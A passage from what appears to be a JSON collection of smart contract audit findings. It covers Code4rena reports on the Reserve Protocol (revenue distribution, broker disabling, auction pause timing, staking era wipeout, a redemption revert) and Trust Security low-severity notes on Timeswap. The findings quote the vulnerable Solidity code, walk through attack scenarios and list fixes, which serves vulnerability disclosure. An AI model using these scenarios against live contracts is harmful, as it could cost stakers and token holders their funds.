mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Distribute revenue in `setDistribution`.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/878\n\n**Status:** Mitigation error. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/36) and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/10) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the Reserve Protocol where incorrect revenue distribution was used in the `Distributor.setDistribution` function. This could lead to wrong distributions of revenue from the `rTokenRevenueTrader` and `rsrTokenRevenueTrader` contracts. The `BackingManager.forwardRevenue` function sends revenue amount to the `rsrTrader` and `rTokenTrader` contracts, according to the distribution inside `Distributor` contract. The distribution can be changed at any time. The `RevenueTrader` is responsible for selling provided tokens for a `tokenToBuy` and then distributing it using `Distributor.distribute` function. The problem is that if the distribution is changed, tokens may be stuck in the `rsrTrader` and strsr holders may not receive the full revenue from the time the distribution was created.\n\nTo mitigate this issue, a new function was added to the `RevenueTrader` to allow anyone to transfer a registered ERC20 back to the `BackingManager`, as long as the current distribution for that `tokenToBuy` is 0%. However, this mitigation error was not successful and further investigation is needed to ensure fair distribution to strsr stakers when distribution parameters are changed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/34",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "27334",
      "title": "[M-02] The broker should not be fully disabled by GnosisTrade.reportViolation",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/trading/GnosisTrade.sol#L202> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Broker.sol#L119-L123>\n\nGnosisTrade and DutchTrade are two separate auction systems where the failing of either system should not affect the other one. The current design will have `Broker.sol` disabled when `reportViolation` is invoked by `GnosisTrade.settle()` if the auction's clearing price was below what we assert it should be.\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/trading/GnosisTrade.sol#L202>\n\n```solidity\n                broker.reportViolation();\n```\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Broker.sol#L119-L123>\n\n```solidity\n    function reportViolation() external notTradingPausedOrFrozen {\n        require(trades[_msgSender()], \"unrecognized trade contract\");\n        emit DisabledSet(disabled, true);\n        disabled = true;\n    }\n```\n\nConsequently, both `BackingManager` and `RevenueTrader (rsrTrader and rTokenTrader)` will not be able to call `openTrade()`:\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Broker.sol#L97-L98>\n\n```soliidty\n    function openTrade(TradeKind kind, TradeRequest memory req) external returns (ITrade) {\n        require(!disabled, \"broker disabled\");\n        ...\n```\n\ntill it's resolved by the governance:\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Broker.sol#L180-L183>\n\n```solidity\n    function setDisabled(bool disabled_) external governance {\n        emit DisabledSet(disabled, disabled_);\n        disabled = disabled_;\n    }\n```\n\n### Proof of Concept\n\nThe following `Trading.trytrade()` as inherited by `BackingManager` and `RevenueTrader` will be denied on line 121, deterring recollaterization and boosting of Rtoken and stRSR exchange rate. The former deterrence will have [`Rtoken.redeemTo`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RToken.sol#L190) and [`StRSR.withdraw`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/StRSR.sol#L335) (both [requiring](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RToken.sol#L190) [`fullyCollateralized`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/StRSR.sol#L335)) denied whereas the latter will have the Rtoken and stRSR holders divested of intended gains.\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/mixins/Trading.sol#L113-L126>\n\n```solidty\n    function tryTrade(TradeKind kind, TradeRequest memory req) internal returns (ITrade trade) {\n        /*  */\n        IERC20 sell = req.sell.erc20();\n        assert(address(trades[sell]) == address(0));\n\n        IERC20Upgradeable(address(sell)).safeApprove(address(broker), 0);\n        IERC20Upgradeable(address(sell)).safeApprove(address(broker), req.sellAmount);\n\n121:        trade = broker.openTrade(kind, req);\n        trades[sell] = trade;\n        tradesOpen++;\n\n        emit TradeStarted(trade, sell, req.buy.erc20(), req.sellAmount, req.minBuyAmount);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider having the affected code refactored as follows:\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Broker.sol#L97-L113>\n\n```diff\n    function openTrade(TradeKind kind, TradeRequest memory req) external returns (ITrade) {\n-        require(!disabled, \"broker disabled\");\n\n        address caller = _msgSender();\n        require(\n            caller == address(backingManager) ||\n                caller == address(rsrTrader) ||\n                caller == address(rTokenTrader),\n            \"only traders\"\n        );\n\n        // Must be updated when new TradeKinds are created\n        if (kind == TradeKind.BATCH_AUCTION) {\n+            require(!disabled, \"Gnosis Trade disabled\");\n            return newBatchAuction(req, caller);\n        }\n        return newDutchAuction(req, ITrading(caller));\n    }\n```\n\nThis will have the Gnosis Trade conditionally denied while still allowing the opening of Dutch Trade.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/47#issuecomment-1613867516):**\n > This currently mostly reads like a design suggestion. I can see the merits of disabling the entire broker in the scenario where the invariant has been violated. Probably best as QA, but will allow for sponsor comment before downgrading. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/47#issuecomment-1618919354):**\n > @0xean - We think this should be kept as Medium. It's a good design suggestion that otherwise could lead to the protocol not trading for the length of the governance cycle. This matters when it comes to selling defaulted collateral. \n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Disable dutch auctions on a per-collateral basis, use 4-step dutch trade curve.<br>\n> PRs:<br>\n> - https://github.com/reserve-protocol/protocol/pull/873<br>\n> - https://github.com/reserve-protocol/protocol/pull/869<br>\n\n**Status:** Two mitigation errors. Full details in reports from [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/20) and [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/40) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the current design of the Reserve Protocol, which consists of two separate auction systems, `GnosisTrade` and `DutchTrade`. When `GnosisTrade.settle()` invokes `Broker.reportViolation()`, if the auction's clearing price is below what is expected, `Broker.sol` is disabled, which prevents `BackingManager` and `RevenueTrader` from calling `openTrade()`. This will have the `Rtoken.redeemTo` and `StRSR.withdraw` (both requiring `fullyCollateralized`) denied, and the Rtoken and stRSR holders will be divested of intended gains.\n\nA proof of concept was provided to demonstrate how this bug will affect the protocol. A suggested mitigation step was to have the affected code refactored to conditionally deny Gnosis Trade while still allowing the opening of Dutch Trade.\n\nReserve Protocol then mitigated the bug by disabling Dutch auctions on a per-collateral basis and using a 4-step Dutch Trade curve. Two mitigation errors were identified by Ronnyx2017 and 0xA5DF, which are detailed in their respective reports.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/47",
      "tags": [],
      "finders": [
        "RaymondFam"
      ]
    },
    {
      "id": "27333",
      "title": "[M-01] A Dutch trade could end up with an unintended lower closing price",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/trading/DutchTrade.sol#L160> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RevenueTrader.sol#L46> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BackingManager.sol#L81>\n\n`notTradingPausedOrFrozen` that is turned on and off during an open Dutch trade could have the auction closed with a lower price depending on the timimg, leading to lesser capability to boost the Rtoken and/or stRSR exchange rates as well as a weakened recollaterization.\n\n### Proof of Concept\n\nHere's the scenario:\n\n1.  A 30 minute Dutch trade is opened by the Revenue trader selling a suplus token for Rtoken.\n\n2.  Shortly after the price begins to decrease linearly, Alice calls [`bid()`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/plugins/trading/DutchTrade.sol#L146-L164). As can be seen in line 160 of the code block below, `settleTrade()` is externally called on the `origin`, RevenueTrader.sol in this case:\n\n```solidity\n    function bid() external returns (uint256 amountIn) {\n        require(bidder == address(0), \"bid already received\");\n\n        // {qBuyTok}\n        amountIn = bidAmount(uint48(block.timestamp)); // enforces auction ongoing\n\n        // Transfer in buy tokens\n        bidder = msg.sender;\n        buy.safeTransferFrom(bidder, address(this), amountIn);\n\n        // status must begin OPEN\n        assert(status == TradeStatus.OPEN);\n\n        // settle() via callback\n160:        origin.settleTrade(sell);\n\n        // confirm callback succeeded\n        assert(status == TradeStatus.CLOSED);\n    }\n```\n\n3.  However, her call is preceded by [`pauseTrading()`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/mixins/Auth.sol#L169-L172) invoked by a `PAUSER`, and denied on line 46 of the function below:\n\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RevenueTrader.sol#L43-L52>\n\n```solidity\n    function settleTrade(IERC20 sell)\n        public\n        override(ITrading, TradingP1)\n46:        notTradingPausedOrFrozen\n        returns (ITrade trade)\n    {\n        trade = super.settleTrade(sell); // nonReentrant\n        distributeTokenToBuy();\n        // unlike BackingManager, do _not_ chain trades; b2b trades of the same token are unlikely\n    }\n```\n\n4.  As the auction is nearing to `endTime`, the `PAUSER` calls [`unpauseIssuance()`](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/mixins/Auth.sol#L176-L179).\n\n5.  Bob, the late comer, upon seeing this, proceeds to calling `bid()` and gets the sell token for a price much lower than he would initially expect before the trading pause.\n\n\n### Recommended Mitigation Steps\n\nConsider removing `notTradingPausedOrFrozen` from the function visibility of `RevenueTrader.settleTrade` and `BackingManager.settleTrade`. This will also have a good side effect of allowing the settling of a Gnosis trade if need be. Collectively, the settled trades could at least proceed to helping boost the RToken and/or stRSR exchange rates that is conducive to the token holders redeeming and withdrawing. The same shall apply to enhancing recollaterization, albeit future tradings will be halted if the trading pause is still enabled.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/48#issuecomment-1613819858):**\n > This also seems like QA.  It outlines a very specific set of events that are very unlikely to occur during production scenarios and would additionally come down to admin misconfiguration / mismanagement.  will wait for sponsor comment, but most likely downgrade to QA.\n\n > > - The PAUSER role should be assigned to an address that is able to act quickly in response to off-chain events, such as a Chainlink feed failing. It is acceptable for there to be false positives, since redemption remains enabled.\n> \n> It is good to consider this quote from the documentation stating that pausing may have false positives. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/48#issuecomment-1618926905):**\n > @0xean - We believe a malicious pauser attack vector is dangerous enough that the issue is Medium and deserves a mitigation. Agree with suggested mitigation.\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Allow settle trade when paused or frozen.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/876\n\n**Status:** Mitigation confirmed. Full details in reports from [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/5), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/32), and [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/9) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reserve Protocol's Dutch Trading system, which could lead to a lower price for a token being sold in an auction and hence reduce the capability to boost the Rtoken and/or stRSR exchange rates, as well as weaken recollaterization.\n\nThe scenario starts with a 30-minute Dutch trade being opened by the Revenue trader selling a surplus token for Rtoken. Shortly after, Alice calls the `bid()` function which calls the `settleTrade()` function externally on the `origin`, RevenueTrader.sol in this case. However, her call is preceded by `pauseTrading()` invoked by a `PAUSER`, and denied on line 46 of the `settleTrade()` function. As the auction is nearing its `endTime`, the `PAUSER` calls `unpauseIssuance()`. Bob, the late comer, upon seeing this, proceeds to calling `bid()` and gets the sell token for a price much lower than he would initially expect before the trading pause.\n\nThe recommended mitigation step is to remove `notTradingPausedOrFrozen` from the function visibility of `RevenueTrader.settleTrade` and `BackingManager.settleTrade`. This will also have a good side effect of allowing the settling of a Gnosis trade if need be. The mitigation was confirmed and a pull request was made to allow `settleTrade()` when paused or frozen.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/48",
      "tags": [],
      "finders": [
        "RaymondFam"
      ]
    },
    {
      "id": "27332",
      "title": "[H-02] A new era might be triggered despite a significant value being held in the previous era",
      "impact": "HIGH",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/StRSR.sol#L441-L444> <br><https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/StRSR.sol#L457-L460>\n\nWhen RSR seizure occurs the staking and drafting rate is adjusted accordingly, if any of those rates is above some threshold then a new era begins (draft or staking era accordingly), wiping out all of the holdings of the current era.\nThe assumption is that if the rate is above the threshold then there's not much staking or drafts left after the seizure (and therefore it makes sense to begin a new era).\nHowever, there might be a case where a previous seizure has increased the staking/draft rate close to the threshold, and then even a small seizure would make it cross this threshold. In that case the total value of staking or drafts can be very high, and they will all be wiped out by starting a new era.\n\n### Impact\n\nStakers will lose their holdings or pending drafts.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n*   Max stake rate is 1e9\n*   A seizure occurs and the new rate is now 91e7\n*   Not much staking is left after the seizure, but as time passes users keep staking bring back the total stakes to a significant value\n*   A 10% seizure occurs, this causes the staking rate to cross the threshold (getting to 1.01e9) and start a new era\n\nThis means the stakings were wiped out despite holding a significant amount of value, causing a loss for the holders.\n\n### Recommended Mitigation Steps\n\nThis one is a bit difficult to mitigate.\nOne way I can think of is to add a 'migration' feature, where in such cases a new era would be created but users would be able to transfer the funds that they held in the previous era into the new era. But this would require some significant code changes and checking that this doesn't break anything or introduces new bugs.\n\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/2#issuecomment-1588260840):**\n > @0xA5DF thoughts on a governance function that requires the ratio be out of bounds, that does `beginEra()` and/or `beginDraftEra()`? \n> \n> The idea is that stakers can mostly withdraw, and since governance thresholds are all percentage, vote to immolate themselves and re-start the staking pool. I think it should treat `beginEra()` and `beginDraftEra()` separately, but I'm not confident in that yet. \n\n**[tbrent (Reserve) acknowledged and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/2#issuecomment-1620824773):**\n > We're still not sure how to mitigate this one. Agree it should be considered HIGH and a new issue.\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Adds governance function to manually push the era forward.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/888\n\n**Status:** Mitigation confirmed. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/31), [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/8), and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/11) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about the Reserve Protocol, a decentralized financial system. It concerns the StRSR.sol file, which is responsible for regulating the staking and drafting rate. When a RSR seizure occurs, the staking and drafting rate is adjusted, and if either rate is above a certain threshold, a new era begins, wiping out all of the holdings of the current era. This is an issue because in some cases, a previous seizure could cause the rate to be close to the threshold, and then a small seizure could cause the rate to cross the threshold, resulting in a large amount of staking or drafts being wiped out. \n\nThis bug has an impact on stakers, who will lose their holdings or pending drafts. A proof of concept was provided which demonstrated how a 10% seizure could cause the staking rate to cross the threshold and start a new era, resulting in stakings being wiped out despite holding a significant amount of value.\n\nThe recommended mitigation step was to add a 'migration' feature, where a new era would be created but users would be able to transfer the funds from the previous era into the new era. However, this would require some significant code changes and checking that this doesn't break anything or introduce new bugs. \n\nThe Reserve Protocol team then suggested a governance function that requires the ratio be out of bounds, that does `beginEra()` and/or `beginDraftEra()`. However, they were still unsure how to mitigate this one, and agreed it should be considered HIGH and a new issue. \n\nThe bug was eventually mitigated by adding a governance function to manually push the era forward, and the mitigation was confirmed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/2",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "27331",
      "title": "[H-01] Custom redemption might revert if old assets were unregistered",
      "impact": "HIGH",
      "content": "\n`quoteCustomRedemption()` works under the assumption that the maximum size of the `erc20sAll` should be `assetRegistry.size()`, however there can be cases where an asset was unregistered but still exists in an old basket, making the size of the old basket greater than `assetRegistry.size()`. In that case the function will revert with an index out of bounds error.\n\n### Impact\n\nUsers might not be able to use `redeemCustom` when needed.\n\nI think this should be considered high severity, since being able to redeem the token at all time is an essential feature for the protocol that's allowed also while frozen.\nNot being able to redeem can result in a depeg or in governance becoming malicious and stealing RToken collateral.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n*   RToken deployed with 0.9 USDC, 0.05 USDT, 0.05 DAI\n*   Governance passed a vote to change it to 0.9 DAI and 0.1 USDC and un-register USDT\n*   Trading is paused before execution, so the basket switch occurs but the re-balance can't be executed. Meaning the actual assets that the backing manager holds are in accordance with the old basket\n*   A user wants to redeem using the old basket, but custom redemption reverts\n\nAs for the revert:\n\n*   `erc20sAll` is created [here](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BasketHandler.sol#L391-L392) with the length of `assetRegistry.size()`, which is 2 in our case.\n*   Then in [this loop](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BasketHandler.sol#L397-L428) the function tries to push 3 assets into `erc20sAll` which will result in an index-out-of-bonds error\n\n(the function doesn't include in the final results assets that aren't registered, but it does push them too into `erc20sAll`)\n\n### Recommended Mitigation Steps\n\nAllow the user to specify the length of the array `erc20sAll` to avoid this revert\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1586269794):**\n > I believe this to be a stretch for high severity. It has several pre-conditions to end up in the proposed state and I do believe it would be entirely possible for governance to change back to the original state (USDC, USDT, DAI), so assets wouldn't be lost and the impact would more be along the lines of a temporary denial of service.\n> \n> Look forward to warden and sponsor comments. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1587948710):**\n > @0xA5DF - nice find! Thoughts on an alternative mitigation?\n> - Could move L438 to just after L417, so that `erc20sAll` never includes unregistered ERC20s\n> - Would probably have to cache the assets as `assetsAll` for re-use around L438\n> - Has side-effect of making the ERC20 return list never include unregistered ERC20s. Current implementation can return a 0 value for an unregistered ERC20. This is properly handled by the RToken contract, but still, nice-to-have.\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1587988163):**\n > Hey @tbrent -<br>\n> That can work as well, the only downside I can think of is that in case there's an asset that's not registered and is repeated across different baskets - the `toAsset()` would be called multiple times for that asset (while under the current implementation and under the mitigation I've suggested it'll be called only once), this would cost about 300 gas units per additional call (100 for the call, 2 `sload`s to a warm slot inside the call itself)\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1588023172):**\n> @0xA5DF - Noted, good point.\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1620824425)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1632948695):**\n > @tbrent - do you care to comment on your thoughts on severity? I am leaning towards M on this, but it sounds like you believe it is correct as labeled (high). \n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/4#issuecomment-1632984393):**\n > @0xean - Correct, I think high is appropriate. \n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Fix `redeemCustom`.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/857\n\n**Status:** Mitigation confirmed. Full details in reports from [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/7), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/30), and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/3) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the `quoteCustomRedemption()` function of the Reserve Protocol. This function works under the assumption that the maximum size of the `erc20sAll` array should be `assetRegistry.size()`, however there can be cases where an asset was unregistered but still exists in an old basket, making the size of the old basket greater than `assetRegistry.size()`. This can cause the function to revert with an index out of bounds error, preventing users from using `redeemCustom` when needed. \n\nThis bug was considered high severity, as not being able to redeem can result in a depeg or in governance becoming malicious and stealing RToken collateral. To demonstrate the issue, a scenario was presented where a user wants to redeem using the old basket, but custom redemption reverts.\n\nTo mitigate the issue, it was suggested that the user should be allowed to specify the length of the array `erc20sAll` to avoid the revert. An alternative mitigation was also suggested, which was to move a certain line of code and cache the assets as `assetsAll` for re-use. However, this had the side-effect of making the ERC20 return list never include unregistered ERC20s. \n\nReserve ultimately mitigated the issue by fixing `redeemCustom`. The mitigation was confirmed by reports from three different sources.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/4",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "20283",
      "title": "Integration tests to simulate main user workflows",
      "impact": "LOW",
      "content": "There are no tests that involve setup of the Options, Pool, and Token contracts and testing\nthat different ways Timeswap is used like:\n1. User borrowing\n2. User lending\n3. User providing liquidity\n4. Liquidity provider collecting fees\n5. Lender collecting principal and yield after maturity\n6. Borrower repaying before maturity\nThe scenarios above are the main ways we identified Timeswap is used and there are more\ntests that can be written that cover failure paths and possibly other identified edge cases.\nIntegration tests make it easier to change code that have cross-contract effects and serve as\nreference for auditors or new developers to understand how the contracts are meant to be\nused.\n \n ### Documentation website uses different terminology from the actual code\nThe documentation website refers to Collateral Claim Tokens and Bond Tokens, for example,\nbut none of those terms are used in the codebase. There is an additional layer of translation if you want a high-level understanding of the codebase from reading the documentation.\nIdeally, the codebase uses the same terms as the documentation website. At the least, the\nwebsite documentation or documentation in the code should have a glossary that translates\nterms in the documentation to the variables or fields used in the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20282",
      "title": "Distinguish Q-numbers",
      "impact": "LOW",
      "content": "The codebase uses Q-numbers and performs mathematical operations on them. To make it\neasier to distinguish variables holding Q-numbers from other variables, consider adding\nsuffixed to variables with Q-numbers. For example, the pool’s **sqrtInterestRate** (which stores\na Q64.96 number) can be named **sqrtInterestRateX96** to make it clear that this is a Q-number\nwith 96 bits in the fractional part. This will make reading and checking mathematical\noperations with Q-numbers easier.\nIt’s also recommended to document each Q-number’s type in function arguments. In the\naudited code, only Pool.sqrtInterestRate is documented to be a UQ64.96.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20281",
      "title": "Avoid using magic numbers",
      "impact": "LOW",
      "content": "The codebase extensively uses magic numbers to denote fixed-decimal numbers (e.g.\nuint256(1) << 128, uint256(1) << 16, uint256(1) << 96, uint256(1) << 192). To make it easier to\nunderstand the meaning of the number when reading the code, consider extracting them into\nlibraries and giving them meaningful names. For example, uint256(1) << 128 can be named\n**Q128** to clarify that the number represents the fractional decimals of a Q-number.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20280",
      "title": "TRST-L-3 Protocol fees management",
      "impact": "LOW",
      "content": "**Description:**\nTimeswap pools subtract protocol fees from transaction fees. The size of protocol fees is set\nby the protocol owners upon deployment of pools. Potentially, protocol fees can be as big as\n100% of transaction fees, leaving liquidity providers without earnings. It’s recommended that\nliquidity providers check the **transactionFee** and **protocolFee** methods of pools before\nproviding liquidity to ensure that protocol fees are not too big.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20279",
      "title": "TRST-L-2 Missing indexed fields in ITimeswapV2PoolFactory.Created",
      "impact": "LOW",
      "content": "**Description:**\nThe ITimeswapV2PoolFactory.Create event doesn’t have indexed fields. Event fields marked\nwith the **indexed** keywords are indexed by Ethereum nodes to make searched and filtering\neventsfaster. If an event doesn’t have indexed fields, off-chain monitoring and analyzing tools\nwill have to scan the entire transaction history of a contract to find and filter events by field\nvalues.\n\n**Recommended Mitigation:**\nConsider adding indexed fields to the ITimeswapV2PoolFactory.Create event. The three fields\nof the event look like valid candidates to be indexed since, for off-chain monitoring tools, it\ncan be important to filter events by pool creators, option pair addresses, and pool pair\naddresses.\n\n**Team Response:**\nThe issue was fixed as is suggested, commit (https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/482/commits/853391edc40c61892d6576f8f9bf9b215668939b)\n\n**Mitigation review**\nThe code was updated as per the recommendation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20278",
      "title": "TRST-L-1 Incorrect validation of strike price",
      "impact": "LOW",
      "content": "**Description:**\nWhen validating the properties of TimeswapV2PoolCollectProtocolFeesParam and\nTimeswapV2PoolCollectTransactionFeesAndShortReturnedParam, `Error.zeroInput()` is thrown\nif both requested token amounts and the strike price are zero. This would make a positive\nrequested token amount and a zero strike price pass the check, while zero strike price is\ninvalid.\n\n**Recommended Mitigation:**\nConsider reworking the logic of the checks as follows:\n1. If all requested token amounts are 0, revert.\n2. Or, if the strike price is zero, revert.\n\n**Team Response:**\nThe issue was fixed, as is suggested, commit (https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/482/commits/6cb06436be4dfb0c3123dd3a7f86bad395351cae)\n\n**Mitigation review:**\nThe code was updated as per the recommendation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20277",
      "title": "TRST-M-3 Wrong ERC1155 metadata URI",
      "impact": "MEDIUM",
